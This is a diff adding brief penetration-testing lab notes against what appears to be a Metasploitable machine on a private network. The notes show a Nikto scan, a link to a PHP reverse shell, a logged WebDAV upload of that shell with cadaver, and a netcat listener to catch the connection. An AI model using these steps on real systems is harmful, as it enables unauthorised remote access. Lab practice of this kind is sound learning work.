@@ -1,0 +1,27 @@
+Nikto ----------------
+
+#nikto -h http://192.168.1.38/dav:wq
+
+
+PHP reverse Shell -------------
+
+https://pentestmonkey.net/tools/web-shells/php-reverse-shell
+
+
+
+
+Putting  --------- 
+
+┌──(kali㉿kali)-[~/…/002.Metasploitable/Port.80/Put.Method/php-reverse-shell-1.0]
+└─$ cadaver http://192.168.1.38/dav/                                                                                                                                                                                                   255 ⨯
+dav:/dav/> put php-reverse-shell.php 
+Uploading php-reverse-shell.php to `/dav/php-reverse-shell.php':
+Progress: [=============================>] 100.0% of 5494 bytes succeeded.
+Terminated by signal 2.
+Connection to `192.168.1.38' closed.
+                                       
+
+Listening ----------------------
+
+
+nc -nlvp 1111
